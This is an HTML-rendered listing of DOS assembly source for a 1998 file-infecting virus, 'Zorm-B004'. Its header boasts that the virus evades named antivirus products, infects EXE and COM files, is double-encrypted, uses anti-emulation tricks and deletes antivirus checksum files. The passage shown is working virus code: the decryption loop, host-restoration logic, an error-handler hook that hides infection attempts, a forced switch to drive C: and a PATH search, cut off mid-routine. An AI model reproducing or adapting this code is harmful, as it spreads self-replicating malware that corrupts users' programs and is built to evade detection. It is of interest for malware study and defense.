<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    ллллллллллллллллллллл\ лллллллллллл\ лллллллллллллл\     лл\         лл\
;                  млллл\   лл\       лл\ лл\        ллл\     лллл\     лллл\
;                млллл\     лл\       лл\ лл\        ллл\     лл\ лл\ лл\ лл\
;              млллл\       лл\       лл\ лллллллллллл\ \     лл\   лл\   лл\                        </span><span class="sc0">
</span><span class="sc1">;            млллл\         лл\       лл\ лл\         лл\     лл\         лл\
;          млллл\           лл\       лл\ лл\          лл\    лл\         лл\                                        </span><span class="sc0">
</span><span class="sc1">;        млллл\             лл\       лл\ лл\           лл\   лл\         лл\
;      млллл\               лл\       лл\ лл\            лл\  лл\         лл\
;    млллллллллллллллллллл\ лллллллллллл\ лл\             лл\ лл\         лл\
;</span><span class="sc0">
</span><span class="sc1">;(C)By Dr L. from Lamer Corporation  March/July 1998</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Description:</span><span class="sc0">
</span><span class="sc1">;             -      Name:..........Zorm-B004     </span><span class="sc0">
</span><span class="sc1">;             -      Mode:..........Direct infector no TSR</span><span class="sc0">
</span><span class="sc1">;             -    Target:..........Exe/Com of Msdos (even com of dos7+)</span><span class="sc0">
</span><span class="sc1">;             -    Status:..........Not detected by Tbav806,F-prot301,228        </span><span class="sc0">
</span><span class="sc1">;                                   dr.Web,Avp30,nod-ice,findvirus786  </span><span class="sc0">
</span><span class="sc1">;                                                   (2nd+ generations)      </span><span class="sc0">
</span><span class="sc1">;             - Description: </span><span class="sc0">
</span><span class="sc1">;               This virus infects 2 exe+2 com files when executed.             </span><span class="sc0">
</span><span class="sc1">;               Can change of directory by using both dot-dot method</span><span class="sc0">
</span><span class="sc1">;               and the path variable of dos environnment.</span><span class="sc0">
</span><span class="sc1">;               It doesnt contain nasty routines.</span><span class="sc0">
</span><span class="sc1">;               Its twice encrypted and use several anti-emulation</span><span class="sc0">
</span><span class="sc1">;               routines.It doesnt infect command.com and win.com </span><span class="sc0">
</span><span class="sc1">;               of win95.  </span><span class="sc0">
</span><span class="sc1">;               It erases most checksums files made by anti-virus  </span><span class="sc0">
</span><span class="sc1">;               in the directories where it have found targets to</span><span class="sc0">
</span><span class="sc1">;               infect.</span><span class="sc0">
</span><span class="sc1">;               Anti-lamer routine included :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;             - Disclaimer:</span><span class="sc0">
</span><span class="sc1">;               This virus was written for research and educationnal</span><span class="sc0">
</span><span class="sc1">;               purposes.</span><span class="sc0">
</span><span class="sc1">;               Its the 4th version of this serie.</span><span class="sc0">
</span><span class="sc1">;               I have fixed some bugs.</span><span class="sc0">
</span><span class="sc1">;               But one problem still remains:</span><span class="sc0">
</span><span class="sc1">;                       This virus can damaged win.com/command.com of</span><span class="sc0">
</span><span class="sc1">;                       win31 when executed or maybe all can be fine</span><span class="sc0">
</span><span class="sc1">;                       i cant study this problem cause i dont have </span><span class="sc0">
</span><span class="sc1">;                       win31!</span><span class="sc0">
</span><span class="sc1">;                          </span><span class="sc0">
</span><span class="sc1">;                         </span><span class="sc0">
</span><span class="sc1">;               Compile :tasm/m2 ,tlink/t </span><span class="sc0">
</span><span class="sc1">;                    </span><span class="sc0">



</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">                         </span><span class="sc1">;memory model</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">                               </span><span class="sc1">;size &lt;65536 </span><span class="sc0">

</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">                            </span><span class="sc1">;its a com file</span><span class="sc0">


</span><span class="sc1">;-------------------------Beginning---of----loader----------------------</span><span class="sc0">
</span><span class="sc5">start1</span><span class="sc4">:</span><span class="sc0">                               
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">;jmp 001 byte forward</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'V'</span><span class="sc0">                              </span><span class="sc1">;infection mark</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                             </span><span class="sc1">;save dx for later</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc0">                            </span><span class="sc1">;set ds=cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">                            </span><span class="sc1">; </span><span class="sc0">
        
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_ds</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">               </span><span class="sc1">;save original ds for </span><span class="sc0">
                                    </span><span class="sc1">;later</span><span class="sc0">
          
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">com_virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;for the first time           </span><span class="sc0">
                                    </span><span class="sc1">;you have to  do that</span><span class="sc0">
                                    </span><span class="sc1">;(read below)</span><span class="sc0">
 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;set bp the delta offset</span><span class="sc0">
                                    </span><span class="sc1">;to zero.No shift to begin</span><span class="sc0">
 

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">over_there</span><span class="sc0">

</span><span class="sc1">;---------------------------End-----of------loader----------------------</span><span class="sc0">


                                  

</span><span class="sc1">;----------------------------Beginning--of--virus-----------------------</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">                                
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                           </span><span class="sc1">;set dx=0 for stability</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">end_2nd</span><span class="sc4">-</span><span class="sc5">begin_2nd</span><span class="sc0">            </span><span class="sc1">;cx=nber of bytes to decrypt</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc0">                          </span><span class="sc1">;thanx to yesna to show me this </span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">itsok</span><span class="sc0">                            </span><span class="sc1">;trick ;) </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">itsok</span><span class="sc4">:</span><span class="sc0">

 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">                          </span><span class="sc1">;anti-emulation trick. function 3dh </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;int 21h= open file function.ds:dx</span><span class="sc0">
</span><span class="sc1">;mov al,02h                                    ;have to point to file name.</span><span class="sc0">
                                    </span><span class="sc1">;but ds:dx points tojunk so dos returns</span><span class="sc0">
                                    </span><span class="sc1">;al=02h.We use this value to decrypt</span><span class="sc0">
  
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">                              </span><span class="sc1">;=add al,10h</span><span class="sc0">
       </span><span class="sc5">value</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

               
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">                             </span><span class="sc1">;mov bx,patch</span><span class="sc0">
</span><span class="sc5">patch</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;patch=addr of begin_2nd.</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">;patch will be set later. </span><span class="sc0">
                                    
</span><span class="sc1">;settings for decrypt bytes between begin_2nd and end_second is over.</span><span class="sc0">



</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;crypt/decrypt "routine"</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;remark: _ret will be changed into "ret"  to transform this part </span><span class="sc0">
</span><span class="sc1">;in a real asm routine.</span><span class="sc0">


</span><span class="sc5">crypt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">turn_again</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">turn_again</span><span class="sc0">
</span><span class="sc5">_ret</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">ret</span><span class="sc0">                            </span><span class="sc1">;to be replaced</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">


</span><span class="sc5">begin_2nd</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">0c6h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">           </span><span class="sc1">;=mov byte ptr cs:[ret_addr],c3h</span><span class="sc0">
</span><span class="sc5">ret_addr</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;(ret_addr=address where to put 'ret'.  </span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c3h</span><span class="sc0">                   </span><span class="sc1">;c3h=opcode for "ret")</span><span class="sc0">
          

          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">                   </span><span class="sc1">;=mov bx,0000h</span><span class="sc0">
          </span><span class="sc5">patch2</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;(patch2=addr of beginning of begin_main)</span><span class="sc0">
       
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc0">                   </span><span class="sc1">;=mov al,2</span><span class="sc0">
              </span><span class="sc5">_al</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                                    </span><span class="sc1">;(_al=xor key.Not fixed value during</span><span class="sc0">
                                    </span><span class="sc1">;infection scheme.see below)   </span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">end_main</span><span class="sc4">-</span><span class="sc5">begin_main</span><span class="sc0">         </span><span class="sc1">;setting to decrypt bytes between </span><span class="sc0">
                                    </span><span class="sc1">;label begin_main and end_main is</span><span class="sc0">
                                    </span><span class="sc1">;complete</span><span class="sc0">
                                     
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">                         </span><span class="sc1">;decrypt now!</span><span class="sc0">
 </span><span class="sc5">end_2nd</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc5">begin_main</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">         </span><span class="sc1">;if cs=ss i'm a com </span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">;if not,i'm exe! </span><span class="sc0">
                   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">im_com</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">im_exe</span><span class="sc4">:</span><span class="sc0">                  
                  </span><span class="sc6">cli</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">         </span><span class="sc1">;reset ss=cs </span><span class="sc0">
                  </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;at the start ss=cs+1 to avoid</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">;"k" flag of tbav.Maybe its a  </span><span class="sc0">
                  </span><span class="sc6">sti</span><span class="sc0">               </span><span class="sc1">;lame way to do that but dont know</span><span class="sc0">
                                    </span><span class="sc1">;how to use an other way.</span><span class="sc0">
 
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">compute_delta</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                           </span><span class="sc1">;save ds for later</span><span class="sc0">
    
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                           </span><span class="sc1">;set ds=cs</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">com_virus</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;i'm not a com (save this info</span><span class="sc0">
                                    </span><span class="sc1">;for later) </span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_exe</span><span class="sc0">                      </span><span class="sc1">;whats follow for a exe file host?</span><span class="sc0">
                                    
</span><span class="sc5">im_com</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                             </span><span class="sc1">;save it for later</span><span class="sc0">



</span><span class="sc5">compute_delta_offset</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">compute_delta</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">com_virus</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">;yep i'm a com file </span><span class="sc0">

</span><span class="sc5">next_exe</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;set ax=original ds</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_ds</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;set _ds=original ds</span><span class="sc0">
                                    </span><span class="sc1">;you need it for pass</span><span class="sc0">
                                    </span><span class="sc1">;control to host.</span><span class="sc0">

</span><span class="sc5">over_there</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;remember me?</span><span class="sc0">
                                    </span><span class="sc1">;for the first execution </span><span class="sc0">
                                    </span><span class="sc1">;no need to decrypt</span><span class="sc0">
                                    

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                             </span><span class="sc1">;save es</span><span class="sc0">
     
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                             </span><span class="sc1">;set es=cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">com_virus</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">;i'm a com?</span><span class="sc0">
 
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">follow_me</span><span class="sc0">                       </span><span class="sc1">;nope</span><span class="sc0">
 
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">store_bytes</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">               </span><span class="sc1">;yep i'm </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                         </span><span class="sc1">;ready to transfer byte from</span><span class="sc0">
                                    </span><span class="sc1">;location "store_bytes" to </span><span class="sc0">
                                    </span><span class="sc1">;beginning of (com) host.</span><span class="sc0">
                                    </span><span class="sc1">;(remember the code of *.com</span><span class="sc0">
                                    </span><span class="sc1">;begin to cs:100h in memory)   </span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">transfer</span><span class="sc0">

</span><span class="sc5">follow_me</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc1">;cld</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">store</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">                     </span><span class="sc1">;transfer from label "store"</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">old</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">                       </span><span class="sc1">;to label "old"</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">                               </span><span class="sc1">;(set the correct values, segment: </span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">                               </span><span class="sc1">;offset for the return to host.)</span><span class="sc0">

</span><span class="sc5">transfer</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">                               </span><span class="sc1">;you came from "mov di,100h"? ok </span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">                               </span><span class="sc1">;restore (in memory only) the 4 first  </span><span class="sc0">
                                    </span><span class="sc1">;originals bytes of host.</span><span class="sc0">
 
                                    </span><span class="sc1">;you came from "follow me"? ok restore</span><span class="sc0">
                                    </span><span class="sc1">;originals cs:ip and ss:sp found in</span><span class="sc0">
                                    </span><span class="sc1">;host (exe) header</span><span class="sc0">
 
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                              </span><span class="sc1">;beware im back!</span><span class="sc0">
 
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">new_dta</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">                   </span><span class="sc1">;dont modify dta!</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_dta</span><span class="sc0">                        </span><span class="sc1">;change it!</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">flag_com</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">      </span><span class="sc1">;at first we want to infect Exe</span><span class="sc0">
                                    

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                             </span><span class="sc1">;see you later!</span><span class="sc0">

</span><span class="sc5">create_new_int24h_handler</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">                        </span><span class="sc1">;                         </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;save original handler                          </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_int24h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">;of int 24h for restore                         </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_int24h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">   </span><span class="sc1">;it later.                         </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">                          </span><span class="sc1">;set a new handler for</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">int_24h</span><span class="sc0">                   </span><span class="sc1">;int 24h.</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;so dos dont pop up </span><span class="sc0">
                                    </span><span class="sc1">;a infamous error message if virus</span><span class="sc0">
                                    </span><span class="sc1">;try to infect write protected</span><span class="sc0">
                                    </span><span class="sc1">;disk.</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                              </span><span class="sc1">;its me again babe!</span><span class="sc0">

</span><span class="sc5">count</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">count_infect</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;reset the counter to 0</span><span class="sc0">
                                    </span><span class="sc1">;self explanory </span><span class="sc0">

</span><span class="sc5">get_dir</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">current_dir</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">              </span><span class="sc1">;save the current directory</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                          </span><span class="sc1">;for later when virus pass </span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                            </span><span class="sc1">;control to host and the return to </span><span class="sc0">
                                    </span><span class="sc1">;dos.the size of buffer is  64 bytes.</span><span class="sc0">
</span><span class="sc5">get_disk</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19H</span><span class="sc0">                 </span><span class="sc1">;from a:or b:or...virus is running?       </span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">disk</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02H</span><span class="sc0">                 </span><span class="sc1">;virus infect c: not other drive.</span><span class="sc0">
                                    </span><span class="sc1">;in practice .</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">search_begin_path</span><span class="sc0">       </span><span class="sc1">;but if you are running the virus </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">;from an drive ,not c:,it infects</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">                 </span><span class="sc1">;drive c:.</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;this part search the adress of first byte of the name of the </span><span class="sc0">
</span><span class="sc1">;first directory include in dos path </span><span class="sc0">
</span><span class="sc1">;remarks:</span><span class="sc0">
</span><span class="sc1">;         es is destroyed by the routine</span><span class="sc0">
</span><span class="sc1">;         es:di points to the address</span><span class="sc0">
</span><span class="sc1">;         we are searching</span><span class="sc0">
          
</span><span class="sc5">search_begin_path</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">002ch</span><span class="sc0">                     </span><span class="sc1">;es:002ch=address of segment where</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;to found in memory the dos path.  </span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">suite</span><span class="sc0">                               
</span><span class="sc5">yet</span><span class="sc4">:</span><span class="sc0"> 
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                          
</span><span class="sc5">suite</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'AP'</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">scasw</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">yet</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
